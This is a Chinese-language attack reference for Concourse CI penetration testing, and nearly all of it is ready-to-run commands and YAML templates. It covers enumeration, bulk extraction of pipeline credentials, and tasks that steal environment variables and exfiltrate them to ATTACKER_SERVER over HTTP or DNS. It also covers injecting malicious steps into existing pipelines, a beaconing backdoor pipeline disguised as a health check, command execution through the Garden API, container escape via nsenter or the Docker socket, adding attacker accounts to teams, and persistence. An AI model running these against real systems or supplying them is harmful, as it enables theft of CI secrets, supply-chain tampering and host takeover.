# Concourse CI 攻击技术参考

本文档包含 Concourse CI 渗透测试的完整命令、API 调用示例、注入模板和利用 Payload。

---

## 1. Fly CLI 认证与基础枚举

### 1.1 登录方式

```bash
# 用户名密码登录
fly -t target login -c https://CONCOURSE_URL -u USERNAME -p PASSWORD

# 使用浏览器 OAuth 登录
fly -t target login -c https://CONCOURSE_URL

# 复用已有 Token（从 .flyrc 或其他来源获取）
# 编辑 ~/.flyrc 直接写入 token
```

### 1.2 .flyrc 文件格式

```yaml
# ~/.flyrc
targets:
  target_name:
    api: https://concourse.example.com
    team: main
    token:
      type: bearer
      value: eyJhbGciOiJSUzI1NiIs...
```

### 1.3 基础枚举命令

```bash
# 当前用户信息
fly -t target userinfo

# 所有 Team
fly -t target teams

# 所有 Pipeline（跨 Team）
fly -t target pipelines -a

# 指定 Team 的 Pipeline
fly -t target pipelines --team TEAM_NAME

# 所有 Worker
fly -t target workers
fly -t target workers --details

# 所有正在运行的 Build
fly -t target builds --all-teams

# 所有容器
fly -t target containers
```

---

## 2. API 调用参考

### 2.1 信息收集 API

```bash
# 实例信息（无需认证）
curl -s https://TARGET/api/v1/info | jq .

# Pipeline 列表（可能无需认证）
curl -s https://TARGET/api/v1/pipelines | jq .

# Team 列表
curl -s https://TARGET/api/v1/teams | jq .

# Build 列表
curl -s https://TARGET/api/v1/builds?limit=50 | jq .

# 指定 Team 的 Pipeline
curl -H "Authorization: Bearer $TOKEN" \
  https://TARGET/api/v1/teams/TEAM/pipelines | jq .
```

### 2.2 Pipeline 配置与变量 API

```bash
# 获取 Pipeline 完整配置（含 Resource source 定义）
curl -H "Authorization: Bearer $TOKEN" \
  https://TARGET/api/v1/teams/TEAM/pipelines/PIPELINE/config | jq .

# Team 级别变量
curl -H "Authorization: Bearer $TOKEN" \
  https://TARGET/api/v1/teams/TEAM/vars | jq .

# Pipeline 级别变量
curl -H "Authorization: Bearer $TOKEN" \
  https://TARGET/api/v1/teams/TEAM/pipelines/PIPELINE/vars | jq .
```

### 2.3 Build 与 Job API

```bash
# Job 列表
curl -H "Authorization: Bearer $TOKEN" \
  https://TARGET/api/v1/teams/TEAM/pipelines/PIPELINE/jobs | jq .

# 触发 Job
curl -X POST -H "Authorization: Bearer $TOKEN" \
  https://TARGET/api/v1/teams/TEAM/pipelines/PIPELINE/jobs/JOB/builds

# Build 事件流（日志）
curl -H "Authorization: Bearer $TOKEN" \
  https://TARGET/api/v1/builds/BUILD_ID/events

# Build Plan
curl -H "Authorization: Bearer $TOKEN" \
  https://TARGET/api/v1/builds/BUILD_ID/plan | jq .

# Resource 列表
curl -H "Authorization: Bearer $TOKEN" \
  https://TARGET/api/v1/teams/TEAM/pipelines/PIPELINE/resources | jq .

# Resource 版本
curl -H "Authorization: Bearer $TOKEN" \
  https://TARGET/api/v1/teams/TEAM/pipelines/PIPELINE/resources/RESOURCE/versions | jq .
```

### 2.4 Pipeline 操作 API

```bash
# 暴露 Pipeline（使其公开可见）
curl -X PUT -H "Authorization: Bearer $TOKEN" \
  https://TARGET/api/v1/teams/TEAM/pipelines/PIPELINE/expose

# 隐藏 Pipeline
curl -X PUT -H "Authorization: Bearer $TOKEN" \
  https://TARGET/api/v1/teams/TEAM/pipelines/PIPELINE/hide

# 暂停/恢复 Pipeline
curl -X PUT -H "Authorization: Bearer $TOKEN" \
  https://TARGET/api/v1/teams/TEAM/pipelines/PIPELINE/pause
curl -X PUT -H "Authorization: Bearer $TOKEN" \
  https://TARGET/api/v1/teams/TEAM/pipelines/PIPELINE/unpause

# 暂停/恢复 Job
curl -X PUT -H "Authorization: Bearer $TOKEN" \
  https://TARGET/api/v1/teams/TEAM/pipelines/PIPELINE/jobs/JOB/pause
curl -X PUT -H "Authorization: Bearer $TOKEN" \
  https://TARGET/api/v1/teams/TEAM/pipelines/PIPELINE/jobs/JOB/unpause
```

---

## 3. Resource 凭据提取

### 3.1 批量提取 Resource Source

```bash
# Fly CLI 方式
fly -t target get-pipeline -p PIPELINE_NAME -j | \
  jq '.resources[] | {name: .name, type: .type, source: .source}'

# 过滤 Git 类型 Resource
fly -t target get-pipeline -p PIPELINE_NAME -j | \
  jq '.resources[] | select(.type=="git") | {name: .name, uri: .source.uri, private_key: .source.private_key, username: .source.username, password: .source.password}'

# 过滤 S3 类型 Resource
fly -t target get-pipeline -p PIPELINE_NAME -j | \
  jq '.resources[] | select(.type=="s3") | {name: .name, bucket: .source.bucket, access_key_id: .source.access_key_id, secret_access_key: .source.secret_access_key}'

# 过滤 Docker 类型 Resource
fly -t target get-pipeline -p PIPELINE_NAME -j | \
  jq '.resources[] | select(.type=="docker-image" or .type=="registry-image") | {name: .name, repository: .source.repository, username: .source.username, password: .source.password}'
```

### 3.2 遍历所有 Pipeline 的 Resource

```bash
# 遍历所有 Pipeline 提取凭据
for pipeline in $(fly -t target pipelines -a --json | jq -r '.[].name'); do
  echo "=== Pipeline: $pipeline ==="
  fly -t target get-pipeline -p "$pipeline" -j 2>/dev/null | \
    jq '.resources[]? | {name, type, source}' 2>/dev/null
done
```

---

## 4. Task 脚本注入模板

### 4.1 环境变量窃取 Task

```yaml
platform: linux
image_resource:
  type: registry-image
  source: {repository: alpine}
inputs:
- name: repo
run:
  path: sh
  args:
  - -c
  - |
    # 导出所有环境变量
    env | sort
    # 搜索挂载的 Secret 文件
    find / -name "*.key" -o -name "*.pem" -o -name "*.json" 2>/dev/null
    # 读取 Concourse 注入的变量
    cat /proc/1/environ | tr '\0' '\n' | sort
```

### 4.2 内网探测 Task

```yaml
platform: linux
image_resource:
  type: registry-image
  source: {repository: alpine}
run:
  path: sh
  args:
  - -c
  - |
    apk add --no-cache curl nmap
    # Worker 网络探测
    ip addr show
    ip route show
    # 探测 Garden API
    curl -s http://127.0.0.1:7777/containers 2>/dev/null | head -100
    # 探测 Baggageclaim
    curl -s http://127.0.0.1:7788/volumes 2>/dev/null | head -100
    # 探测内网常见服务
    for port in 22 80 443 2222 3306 5432 6379 8080 8443 9090; do
      timeout 1 sh -c "echo >/dev/tcp/172.17.0.1/$port" 2>/dev/null && echo "172.17.0.1:$port OPEN"
    done
```

### 4.3 数据外传 Task

```yaml
platform: linux
image_resource:
  type: registry-image
  source: {repository: alpine}
run:
  path: sh
  args:
  - -c
  - |
    apk add --no-cache curl
    # 收集信息
    DATA=$(env | base64 | tr -d '\n')
    # 通过 HTTP 外传
    curl -X POST https://ATTACKER_SERVER/exfil \
      -H "Content-Type: application/json" \
      -d "{\"pipeline\":\"$PIPELINE_NAME\",\"build\":\"$BUILD_ID\",\"data\":\"$DATA\"}"
    # 或通过 DNS 外传（每次 63 字符）
    # nslookup $(echo "$DATA" | cut -c1-63).exfil.attacker.com
```

---

## 5. Job 篡改与 Pipeline 注入

### 5.1 在现有 Pipeline 中注入恶意 Step

```bash
# 导出 Pipeline 配置
fly -t target get-pipeline -p TARGET_PIPELINE > pipeline.yml

# 在 pipeline.yml 的目标 Job 的 plan 中添加恶意 task step:
#
# jobs:
# - name: existing-job
#   plan:
#   - get: source-repo
#   - task: legitimate-task
#     file: source-repo/ci/task.yml
#   - task: injected-task          # <-- 注入的恶意 task
#     config:
#       platform: linux
#       image_resource:
#         type: registry-image
#         source: {repository: alpine}
#       run:
#         path: sh
#         args: ["-c", "env | base64"]

# 应用修改后的 Pipeline
fly -t target set-pipeline -p TARGET_PIPELINE -c pipeline.yml -n

# 触发 Job
fly -t target trigger-job -j TARGET_PIPELINE/existing-job -w
```

### 5.2 完整后门 Pipeline 模板

```yaml
# backdoor_pipeline.yml
resource_types: []

resources:
- name: every-10m
  type: time
  source:
    interval: 10m

jobs:
- name: beacon
  plan:
  - get: every-10m
    trigger: true
  - task: callback
    config:
      platform: linux
      image_resource:
        type: registry-image
        source: {repository: alpine}
      run:
        path: sh
        args:
        - -c
        - |
          apk add --no-cache curl
          HOSTNAME=$(hostname)
          WHOAMI=$(whoami)
          IP=$(wget -qO- http://ifconfig.me 2>/dev/null || echo "unknown")
          curl -s "https://ATTACKER_SERVER/beacon?h=$HOSTNAME&u=$WHOAMI&ip=$IP"
```

```bash
# 部署后门 Pipeline
fly -t target set-pipeline -p monitoring-health-check -c backdoor_pipeline.yml -n
fly -t target unpause-pipeline -p monitoring-health-check
```

---

## 6. Build 日志批量窃取

```bash
# 获取指定 Pipeline 最近 N 个 Build 的日志
PIPELINE="target-pipeline"
for build_id in $(curl -sH "Authorization: Bearer $TOKEN" \
  "https://TARGET/api/v1/teams/main/pipelines/$PIPELINE/builds?limit=20" | \
  jq -r '.[].id'); do
  echo "=== Build $build_id ==="
  curl -sH "Authorization: Bearer $TOKEN" \
    "https://TARGET/api/v1/builds/$build_id/events" | \
    grep -oP '"data":"[^"]*"' | sed 's/"data":"//;s/"$//'
done

# 搜索日志中的敏感信息
fly -t target watch -j PIPELINE/JOB -b BUILD_NUM 2>&1 | \
  grep -iE "password|secret|key|token|credential|aws_|private"
```

---

## 7. intercept 容器利用

```bash
# 列出可进入的容器
fly -t target containers

# 进入指定 Job 的最新 Build 容器
fly -t target intercept -j PIPELINE/JOB

# 进入指定 Step
fly -t target intercept -j PIPELINE/JOB -s STEP_NAME

# 进入指定 Build
fly -t target intercept -j PIPELINE/JOB -b BUILD_NUM

# 在容器内操作
# 读取所有环境变量（含注入的 Secrets）
env | sort
cat /proc/1/environ | tr '\0' '\n'

# 查看挂载的 Resource 内容
ls -la /tmp/build/*/
find / -name "*.pem" -o -name "*.key" -o -name "credentials*" 2>/dev/null

# 网络探测
ip addr show
cat /etc/resolv.conf
cat /etc/hosts
```

---

## 8. Worker 与 Garden API 利用

### 8.1 Garden API 操作

```bash
# 列出所有容器
curl -s http://WORKER_IP:7777/containers | jq .

# 获取容器详情
curl -s http://WORKER_IP:7777/containers/HANDLE/info | jq .

# 在容器中执行命令
curl -s -X POST http://WORKER_IP:7777/containers/HANDLE/processes \
  -H "Content-Type: application/json" \
  -d '{
    "id": "exploit-1",
    "path": "sh",
    "args": ["-c", "id && cat /proc/1/environ | tr \\0 \\n"],
    "env": [],
    "dir": "/"
  }'

# 读取进程输出
curl -s http://WORKER_IP:7777/containers/HANDLE/processes/exploit-1/stdout
```

### 8.2 Baggageclaim 卷操作

```bash
# 列出所有卷
curl -s http://WORKER_IP:7788/volumes | jq '.[].handle'

# 获取卷属性
curl -s http://WORKER_IP:7788/volumes/VOL_HANDLE/properties | jq .

# 卷可能包含 Resource 缓存数据（Git 仓库、S3 对象、Docker 镜像层）
```

---

## 9. 容器逃逸技术

### 9.1 privileged Task 逃逸

```bash
# 如果 Task 配置了 privileged: true
# 检查 capabilities
cat /proc/1/status | grep -i cap
capsh --print

# 挂载宿主机文件系统
mkdir /mnt/host
mount /dev/sda1 /mnt/host
# 或通过 /proc/sysrq-trigger
# 或通过 cgroup release_agent

# 通过 nsenter 进入宿主机命名空间
nsenter -t 1 -m -u -n -i -p -- /bin/sh
```

### 9.2 Docker Socket 逃逸

```bash
# 检查 Docker Socket
ls -la /var/run/docker.sock

# 如果存在，通过 Docker API 创建特权容器
curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["sh", "-c", "chroot /mnt/host sh"],
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/:/mnt/host"]
    }
  }'
```

### 9.3 检测逃逸可能性

```bash
# 综合检测脚本
echo "=== 容器逃逸检测 ==="
echo "--- Capabilities ---"
cat /proc/1/status | grep -i cap 2>/dev/null
echo "--- Docker Socket ---"
ls -la /var/run/docker.sock 2>/dev/null || echo "未找到"
echo "--- Privileged 模式 ---"
ip link add dummy0 type dummy 2>/dev/null && echo "YES: 可创建网络接口（特权模式）" && ip link delete dummy0 || echo "NO"
echo "--- 宿主机 PID ---"
ls /proc/1/root/etc/hostname 2>/dev/null && cat /proc/1/root/etc/hostname || echo "不可读"
echo "--- cgroup ---"
cat /proc/1/cgroup 2>/dev/null | head -5
echo "--- 可写 sysfs ---"
ls -la /sys/kernel/security 2>/dev/null || echo "不可访问"
```

---

## 10. Team 权限提升

### 10.1 Team 配置修改

```bash
# 查看 Team 认证配置
fly -t target get-team -n TEAM_NAME

# 如果拥有 main Team 的 owner 角色，可以修改其他 Team 的认证配置
# 添加自己的账户到目标 Team
fly -t target set-team -n TARGET_TEAM \
  --local-user=admin,attacker_user

# 或添加 GitHub 认证
fly -t target set-team -n TARGET_TEAM \
  --github-user=attacker_github_user
```

### 10.2 跨 Team 信息收集

```bash
# 枚举所有 Team 及其 Pipeline
for team in $(fly -t target teams --json | jq -r '.[].name'); do
  echo "=== Team: $team ==="
  fly -t target pipelines --team "$team" 2>/dev/null
done
```

---

## 11. 持久化策略

### 11.1 Pipeline 后门命名伪装

使用合法的名称来伪装后门 Pipeline：

- `monitoring-healthcheck`
- `dependency-update`
- `cache-cleanup`
- `nightly-backup`

### 11.2 Resource Webhook 后门

```yaml
# 通过 webhook token 触发 Resource check
resources:
- name: trigger
  type: time
  source:
    interval: 999h
  webhook_token: SECRET_TOKEN

# 远程触发
# curl -X POST "https://TARGET/api/v1/teams/TEAM/pipelines/PIPELINE/resources/trigger/check/webhook?webhook_token=SECRET_TOKEN"
```

### 11.3 凭据文件持久化

```bash
# 如果获取到 .flyrc，保存用于后续访问
cat ~/.flyrc

# Token 过期后通过保存的凭据重新登录
fly -t target login -c https://TARGET -u USERNAME -p PASSWORD

# 在多台机器上分布式保存 .flyrc
```
